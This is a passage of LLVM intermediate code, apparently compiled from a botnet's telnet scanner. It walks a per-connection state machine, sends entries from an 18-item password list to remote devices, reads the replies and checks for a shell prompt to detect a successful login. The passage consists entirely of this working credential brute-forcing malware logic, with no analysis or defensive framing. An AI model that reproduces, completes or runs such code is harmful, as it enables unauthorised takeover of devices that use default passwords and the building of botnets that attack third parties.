  %897 = call i32 @sclose(i32 %896)
  %898 = load i32, i32* %2, align 4
  %899 = sext i32 %898 to i64
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %899
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %900, i32 0, i32 2
  store i8 0, i8* %901, align 8
  %902 = load i32, i32* %2, align 4
  %903 = sext i32 %902 to i64
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %903
  %905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %904, i32 0, i32 3
  store i8 0, i8* %905, align 1
  br label %2093

; <label>:906:                                    ; preds = %883
  %907 = load i32, i32* %2, align 4
  %908 = sext i32 %907 to i64
  %909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %908
  %910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %909, i32 0, i32 8
  %911 = load i8*, i8** %910, align 8
  %912 = call i8* @strstr(i8* %911, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0)) #10
  %913 = icmp ne i8* %912, null
  br i1 %913, label %914, label %929

; <label>:914:                                    ; preds = %906
  %915 = load i32, i32* %2, align 4
  %916 = sext i32 %915 to i64
  %917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %916
  %918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %917, i32 0, i32 0
  %919 = load i32, i32* %918, align 16
  %920 = call i32 @sclose(i32 %919)
  %921 = load i32, i32* %2, align 4
  %922 = sext i32 %921 to i64
  %923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %922
  %924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %923, i32 0, i32 2
  store i8 0, i8* %924, align 8
  %925 = load i32, i32* %2, align 4
  %926 = sext i32 %925 to i64
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %926
  %928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %927, i32 0, i32 3
  store i8 0, i8* %928, align 1
  br label %2093

; <label>:929:                                    ; preds = %906
  %930 = load i32, i32* %2, align 4
  %931 = sext i32 %930 to i64
  %932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %931
  %933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %932, i32 0, i32 8
  %934 = load i8*, i8** %933, align 8
  %935 = call i8* @strstr(i8* %934, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %936 = icmp ne i8* %935, null
  br i1 %936, label %937, label %952

; <label>:937:                                    ; preds = %929
  %938 = load i32, i32* %2, align 4
  %939 = sext i32 %938 to i64
  %940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %939
  %941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %940, i32 0, i32 0
  %942 = load i32, i32* %941, align 16
  %943 = call i32 @sclose(i32 %942)
  %944 = load i32, i32* %2, align 4
  %945 = sext i32 %944 to i64
  %946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %945
  %947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %946, i32 0, i32 2
  store i8 0, i8* %947, align 8
  %948 = load i32, i32* %2, align 4
  %949 = sext i32 %948 to i64
  %950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %949
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %950, i32 0, i32 3
  store i8 0, i8* %951, align 1
  br label %2093

; <label>:952:                                    ; preds = %929
  %953 = load i32, i32* %2, align 4
  %954 = sext i32 %953 to i64
  %955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %954
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %955, i32 0, i32 8
  %957 = load i8*, i8** %956, align 8
  %958 = call i8* @strstr(i8* %957, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %959 = icmp ne i8* %958, null
  br i1 %959, label %960, label %975

; <label>:960:                                    ; preds = %952
  %961 = load i32, i32* %2, align 4
  %962 = sext i32 %961 to i64
  %963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %962
  %964 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %963, i32 0, i32 0
  %965 = load i32, i32* %964, align 16
  %966 = call i32 @sclose(i32 %965)
  %967 = load i32, i32* %2, align 4
  %968 = sext i32 %967 to i64
  %969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %968
  %970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %969, i32 0, i32 2
  store i8 0, i8* %970, align 8
  %971 = load i32, i32* %2, align 4
  %972 = sext i32 %971 to i64
  %973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %972
  %974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %973, i32 0, i32 3
  store i8 0, i8* %974, align 1
  br label %2093

; <label>:975:                                    ; preds = %952
  %976 = load i32, i32* %2, align 4
  %977 = sext i32 %976 to i64
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %977
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %978, i32 0, i32 8
  %980 = load i8*, i8** %979, align 8
  %981 = call i8* @strstr(i8* %980, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0)) #10
  %982 = icmp ne i8* %981, null
  br i1 %982, label %983, label %998

; <label>:983:                                    ; preds = %975
  %984 = load i32, i32* %2, align 4
  %985 = sext i32 %984 to i64
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %985
  %987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %986, i32 0, i32 0
  %988 = load i32, i32* %987, align 16
  %989 = call i32 @sclose(i32 %988)
  %990 = load i32, i32* %2, align 4
  %991 = sext i32 %990 to i64
  %992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %991
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %992, i32 0, i32 2
  store i8 0, i8* %993, align 8
  %994 = load i32, i32* %2, align 4
  %995 = sext i32 %994 to i64
  %996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %995
  %997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %996, i32 0, i32 3
  store i8 0, i8* %997, align 1
  br label %2093

; <label>:998:                                    ; preds = %975
  %999 = load i32, i32* %2, align 4
  %1000 = sext i32 %999 to i64
  %1001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1000
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1001, i32 0, i32 8
  %1003 = load i8*, i8** %1002, align 8
  %1004 = call i8* @strstr(i8* %1003, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0)) #10
  %1005 = icmp ne i8* %1004, null
  br i1 %1005, label %1006, label %1021

; <label>:1006:                                   ; preds = %998
  %1007 = load i32, i32* %2, align 4
  %1008 = sext i32 %1007 to i64
  %1009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1008
  %1010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1009, i32 0, i32 0
  %1011 = load i32, i32* %1010, align 16
  %1012 = call i32 @sclose(i32 %1011)
  %1013 = load i32, i32* %2, align 4
  %1014 = sext i32 %1013 to i64
  %1015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1014
  %1016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1015, i32 0, i32 2
  store i8 0, i8* %1016, align 8
  %1017 = load i32, i32* %2, align 4
  %1018 = sext i32 %1017 to i64
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1018
  %1020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1019, i32 0, i32 3
  store i8 0, i8* %1020, align 1
  br label %2093

; <label>:1021:                                   ; preds = %998
  %1022 = load i32, i32* %2, align 4
  %1023 = sext i32 %1022 to i64
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1023
  %1025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1024, i32 0, i32 8
  %1026 = load i8*, i8** %1025, align 8
  %1027 = call i8* @strstr(i8* %1026, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0)) #10
  %1028 = icmp ne i8* %1027, null
  br i1 %1028, label %1029, label %1044

; <label>:1029:                                   ; preds = %1021
  %1030 = load i32, i32* %2, align 4
  %1031 = sext i32 %1030 to i64
  %1032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1031
  %1033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1032, i32 0, i32 0
  %1034 = load i32, i32* %1033, align 16
  %1035 = call i32 @sclose(i32 %1034)
  %1036 = load i32, i32* %2, align 4
  %1037 = sext i32 %1036 to i64
  %1038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1037
  %1039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1038, i32 0, i32 2
  store i8 0, i8* %1039, align 8
  %1040 = load i32, i32* %2, align 4
  %1041 = sext i32 %1040 to i64
  %1042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1041
  %1043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1042, i32 0, i32 3
  store i8 0, i8* %1043, align 1
  br label %2093

; <label>:1044:                                   ; preds = %1021
  %1045 = load i32, i32* %2, align 4
  %1046 = sext i32 %1045 to i64
  %1047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1046
  %1048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1047, i32 0, i32 8
  %1049 = load i8*, i8** %1048, align 8
  %1050 = call i8* @strstr(i8* %1049, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %1051 = icmp ne i8* %1050, null
  br i1 %1051, label %1052, label %1067

; <label>:1052:                                   ; preds = %1044
  %1053 = load i32, i32* %2, align 4
  %1054 = sext i32 %1053 to i64
  %1055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1054
  %1056 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1055, i32 0, i32 0
  %1057 = load i32, i32* %1056, align 16
  %1058 = call i32 @sclose(i32 %1057)
  %1059 = load i32, i32* %2, align 4
  %1060 = sext i32 %1059 to i64
  %1061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1060
  %1062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1061, i32 0, i32 2
  store i8 0, i8* %1062, align 8
  %1063 = load i32, i32* %2, align 4
  %1064 = sext i32 %1063 to i64
  %1065 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1064
  %1066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1065, i32 0, i32 3
  store i8 0, i8* %1066, align 1
  br label %2093

; <label>:1067:                                   ; preds = %1044
  br label %1068

; <label>:1068:                                   ; preds = %1067
  br label %1069

; <label>:1069:                                   ; preds = %1068
  br label %1070

; <label>:1070:                                   ; preds = %1069
  br label %1071

; <label>:1071:                                   ; preds = %1070
  br label %1072

; <label>:1072:                                   ; preds = %1071
  br label %1073

; <label>:1073:                                   ; preds = %1072
  br label %1074

; <label>:1074:                                   ; preds = %1073
  %1075 = load i32, i32* %2, align 4
  %1076 = sext i32 %1075 to i64
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1076
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1077, i32 0, i32 8
  %1079 = load i8*, i8** %1078, align 8
  %1080 = call i64 @strlen(i8* %1079) #10
  %1081 = trunc i64 %1080 to i16
  %1082 = load i32, i32* %2, align 4
  %1083 = sext i32 %1082 to i64
  %1084 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1083
  %1085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1084, i32 0, i32 7
  store i16 %1081, i16* %1085, align 16
  br label %1086

; <label>:1086:                                   ; preds = %1074
  br label %1087

; <label>:1087:                                   ; preds = %1086
  %1088 = load i32, i32* %2, align 4
  %1089 = sext i32 %1088 to i64
  %1090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1089
  %1091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1090, i32 0, i32 6
  %1092 = load i32, i32* %1091, align 4
  %1093 = add i32 %1092, 1426692654
  %1094 = add i32 %1093, 10
  %1095 = sub i32 %1094, 1426692654
  %1096 = add i32 %1092, 10
  %1097 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1098 = icmp ult i32 %1095, %1097
  br i1 %1098, label %1099, label %1114

; <label>:1099:                                   ; preds = %1087
  %1100 = load i32, i32* %2, align 4
  %1101 = sext i32 %1100 to i64
  %1102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1101
  %1103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1102, i32 0, i32 0
  %1104 = load i32, i32* %1103, align 16
  %1105 = call i32 @sclose(i32 %1104)
  %1106 = load i32, i32* %2, align 4
  %1107 = sext i32 %1106 to i64
  %1108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1107
  %1109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1108, i32 0, i32 2
  store i8 0, i8* %1109, align 8
  %1110 = load i32, i32* %2, align 4
  %1111 = sext i32 %1110 to i64
  %1112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1111
  %1113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1112, i32 0, i32 3
  store i8 1, i8* %1113, align 1
  br label %1114

; <label>:1114:                                   ; preds = %1099, %1087
  br label %2092

; <label>:1115:                                   ; preds = %70
  %1116 = load i32, i32* %2, align 4
  %1117 = sext i32 %1116 to i64
  %1118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1117
  %1119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1118, i32 0, i32 0
  %1120 = load i32, i32* %1119, align 16
  %1121 = load i32, i32* %2, align 4
  %1122 = sext i32 %1121 to i64
  %1123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1122
  %1124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1123, i32 0, i32 5
  %1125 = load i8, i8* %1124, align 1
  %1126 = zext i8 %1125 to i64
  %1127 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %1126
  %1128 = load i8*, i8** %1127, align 8
  %1129 = load i32, i32* %2, align 4
  %1130 = sext i32 %1129 to i64
  %1131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1130
  %1132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1131, i32 0, i32 5
  %1133 = load i8, i8* %1132, align 1
  %1134 = zext i8 %1133 to i64
  %1135 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %1134
  %1136 = load i8*, i8** %1135, align 8
  %1137 = call i64 @strlen(i8* %1136) #10
  %1138 = call i64 @send(i32 %1120, i8* %1128, i64 %1137, i32 16384)
  %1139 = icmp slt i64 %1138, 0
  br i1 %1139, label %1140, label %1155

; <label>:1140:                                   ; preds = %1115
  %1141 = load i32, i32* %2, align 4
  %1142 = sext i32 %1141 to i64
  %1143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1142
  %1144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1143, i32 0, i32 0
  %1145 = load i32, i32* %1144, align 16
  %1146 = call i32 @sclose(i32 %1145)
  %1147 = load i32, i32* %2, align 4
  %1148 = sext i32 %1147 to i64
  %1149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1148
  %1150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1149, i32 0, i32 2
  store i8 0, i8* %1150, align 8
  %1151 = load i32, i32* %2, align 4
  %1152 = sext i32 %1151 to i64
  %1153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1152
  %1154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1153, i32 0, i32 3
  store i8 1, i8* %1154, align 1
  br label %2093

; <label>:1155:                                   ; preds = %1115
  %1156 = load i32, i32* %2, align 4
  %1157 = sext i32 %1156 to i64
  %1158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1157
  %1159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1158, i32 0, i32 0
  %1160 = load i32, i32* %1159, align 16
  %1161 = call i64 @send(i32 %1160, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i32 0, i32 0), i64 2, i32 16384)
  %1162 = icmp slt i64 %1161, 0
  br i1 %1162, label %1163, label %1178

; <label>:1163:                                   ; preds = %1155
  %1164 = load i32, i32* %2, align 4
  %1165 = sext i32 %1164 to i64
  %1166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1165
  %1167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1166, i32 0, i32 0
  %1168 = load i32, i32* %1167, align 16
  %1169 = call i32 @sclose(i32 %1168)
  %1170 = load i32, i32* %2, align 4
  %1171 = sext i32 %1170 to i64
  %1172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1171
  %1173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1172, i32 0, i32 2
  store i8 0, i8* %1173, align 8
  %1174 = load i32, i32* %2, align 4
  %1175 = sext i32 %1174 to i64
  %1176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1175
  %1177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1176, i32 0, i32 3
  store i8 1, i8* %1177, align 1
  br label %2093

; <label>:1178:                                   ; preds = %1155
  %1179 = load i32, i32* %2, align 4
  %1180 = sext i32 %1179 to i64
  %1181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1180
  %1182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1181, i32 0, i32 2
  store i8 6, i8* %1182, align 8
  br label %2092

; <label>:1183:                                   ; preds = %70
  %1184 = load i32, i32* %2, align 4
  %1185 = sext i32 %1184 to i64
  %1186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1185
  %1187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1186, i32 0, i32 6
  %1188 = load i32, i32* %1187, align 4
  %1189 = icmp eq i32 %1188, 0
  br i1 %1189, label %1190, label %1196

; <label>:1190:                                   ; preds = %1183
  %1191 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1192 = load i32, i32* %2, align 4
  %1193 = sext i32 %1192 to i64
  %1194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1193
  %1195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1194, i32 0, i32 6
  store i32 %1191, i32* %1195, align 4
  br label %1196

; <label>:1196:                                   ; preds = %1190, %1183
  %1197 = load i32, i32* %2, align 4
  %1198 = sext i32 %1197 to i64
  %1199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1198
  %1200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1199, i32 0, i32 0
  %1201 = load i32, i32* %1200, align 16
  %1202 = load i32, i32* %2, align 4
  %1203 = sext i32 %1202 to i64
  %1204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1203
  %1205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1204, i32 0, i32 8
  %1206 = load i8*, i8** %1205, align 8
  %1207 = load i32, i32* %2, align 4
  %1208 = sext i32 %1207 to i64
  %1209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1208
  %1210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1209, i32 0, i32 7
  %1211 = load i16, i16* %1210, align 16
  %1212 = zext i16 %1211 to i32
  %1213 = call i32 @readUntil(i32 %1201, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1206, i32 1024, i32 %1212)
  %1214 = icmp ne i32 %1213, 0
  br i1 %1214, label %1215, label %1290

; <label>:1215:                                   ; preds = %1196
  %1216 = load i32, i32* %2, align 4
  %1217 = sext i32 %1216 to i64
  %1218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1217
  %1219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1218, i32 0, i32 6
  store i32 0, i32* %1219, align 4
  %1220 = load i32, i32* %2, align 4
  %1221 = sext i32 %1220 to i64
  %1222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1221
  %1223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1222, i32 0, i32 7
  store i16 0, i16* %1223, align 16
  %1224 = load i32, i32* %2, align 4
  %1225 = sext i32 %1224 to i64
  %1226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1225
  %1227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1226, i32 0, i32 8
  %1228 = load i8*, i8** %1227, align 8
  %1229 = call i8* @strstr(i8* %1228, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %1230 = icmp ne i8* %1229, null
  br i1 %1230, label %1231, label %1251

; <label>:1231:                                   ; preds = %1215
  %1232 = load i32, i32* %2, align 4
  %1233 = sext i32 %1232 to i64
  %1234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1233
  %1235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1234, i32 0, i32 8
  %1236 = load i8*, i8** %1235, align 8
  call void @llvm.memset.p0i8.i64(i8* %1236, i8 0, i64 1024, i32 1, i1 false)
  %1237 = load i32, i32* %2, align 4
  %1238 = sext i32 %1237 to i64
  %1239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1238
  %1240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1239, i32 0, i32 0
  %1241 = load i32, i32* %1240, align 16
  %1242 = call i32 @sclose(i32 %1241)
  %1243 = load i32, i32* %2, align 4
  %1244 = sext i32 %1243 to i64
  %1245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1244
  %1246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1245, i32 0, i32 2
  store i8 0, i8* %1246, align 8
  %1247 = load i32, i32* %2, align 4
  %1248 = sext i32 %1247 to i64
  %1249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1248
  %1250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1249, i32 0, i32 3
  store i8 0, i8* %1250, align 1
  br label %2093

; <label>:1251:                                   ; preds = %1215
  %1252 = load i32, i32* %2, align 4
  %1253 = sext i32 %1252 to i64
  %1254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1253
  %1255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1254, i32 0, i32 8
  %1256 = load i8*, i8** %1255, align 8
  %1257 = call i32 @matchPrompt(i8* %1256)
  %1258 = icmp ne i32 %1257, 0
  br i1 %1258, label %1279, label %1259

; <label>:1259:                                   ; preds = %1251
  %1260 = load i32, i32* %2, align 4
  %1261 = sext i32 %1260 to i64
  %1262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1261
  %1263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1262, i32 0, i32 8
  %1264 = load i8*, i8** %1263, align 8
  call void @llvm.memset.p0i8.i64(i8* %1264, i8 0, i64 1024, i32 1, i1 false)
  %1265 = load i32, i32* %2, align 4
  %1266 = sext i32 %1265 to i64
  %1267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1266
  %1268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1267, i32 0, i32 0
  %1269 = load i32, i32* %1268, align 16
  %1270 = call i32 @sclose(i32 %1269)
  %1271 = load i32, i32* %2, align 4
  %1272 = sext i32 %1271 to i64
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1272
  %1274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1273, i32 0, i32 2
  store i8 0, i8* %1274, align 8
  %1275 = load i32, i32* %2, align 4
  %1276 = sext i32 %1275 to i64
  %1277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1276
  %1278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1277, i32 0, i32 3
  store i8 1, i8* %1278, align 1
  br label %2093

; <label>:1279:                                   ; preds = %1251
  %1280 = load i32, i32* %2, align 4
  %1281 = sext i32 %1280 to i64
  %1282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1281
  %1283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1282, i32 0, i32 2
  store i8 7, i8* %1283, align 8
  br label %1284

; <label>:1284:                                   ; preds = %1279
  %1285 = load i32, i32* %2, align 4
  %1286 = sext i32 %1285 to i64
  %1287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1286
  %1288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1287, i32 0, i32 8
  %1289 = load i8*, i8** %1288, align 8
  call void @llvm.memset.p0i8.i64(i8* %1289, i8 0, i64 1024, i32 1, i1 false)
  br label %2093

; <label>:1290:                                   ; preds = %1196
  %1291 = load i32, i32* %2, align 4
  %1292 = sext i32 %1291 to i64
  %1293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1292
  %1294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1293, i32 0, i32 0
  %1295 = load i32, i32* %1294, align 16
  %1296 = load i32, i32* %2, align 4
  %1297 = sext i32 %1296 to i64
  %1298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1297
  %1299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1298, i32 0, i32 8
  %1300 = load i8*, i8** %1299, align 8
  %1301 = load i32, i32* %2, align 4
  %1302 = sext i32 %1301 to i64
  %1303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1302
  %1304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1303, i32 0, i32 7
  %1305 = load i16, i16* %1304, align 16
  %1306 = zext i16 %1305 to i32
  %1307 = call i32 @readUntil(i32 %1295, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1300, i32 1024, i32 %1306)
  %1308 = icmp ne i32 %1307, 0
  br i1 %1308, label %1309, label %1384

; <label>:1309:                                   ; preds = %1290
  %1310 = load i32, i32* %2, align 4
  %1311 = sext i32 %1310 to i64
  %1312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1311
  %1313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1312, i32 0, i32 6
  store i32 0, i32* %1313, align 4
  %1314 = load i32, i32* %2, align 4
  %1315 = sext i32 %1314 to i64
  %1316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1315
  %1317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1316, i32 0, i32 7
  store i16 0, i16* %1317, align 16
  %1318 = load i32, i32* %2, align 4
  %1319 = sext i32 %1318 to i64
  %1320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1319
  %1321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1320, i32 0, i32 8
  %1322 = load i8*, i8** %1321, align 8
  %1323 = call i8* @strstr(i8* %1322, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0)) #10
  %1324 = icmp ne i8* %1323, null
  br i1 %1324, label %1325, label %1345

; <label>:1325:                                   ; preds = %1309
  %1326 = load i32, i32* %2, align 4
  %1327 = sext i32 %1326 to i64
  %1328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1327
  %1329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1328, i32 0, i32 8
  %1330 = load i8*, i8** %1329, align 8
  call void @llvm.memset.p0i8.i64(i8* %1330, i8 0, i64 1024, i32 1, i1 false)
  %1331 = load i32, i32* %2, align 4
  %1332 = sext i32 %1331 to i64
  %1333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1332
  %1334 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1333, i32 0, i32 0
  %1335 = load i32, i32* %1334, align 16
  %1336 = call i32 @sclose(i32 %1335)
  %1337 = load i32, i32* %2, align 4
  %1338 = sext i32 %1337 to i64
  %1339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1338
  %1340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1339, i32 0, i32 2
  store i8 0, i8* %1340, align 8
  %1341 = load i32, i32* %2, align 4
  %1342 = sext i32 %1341 to i64
  %1343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1342
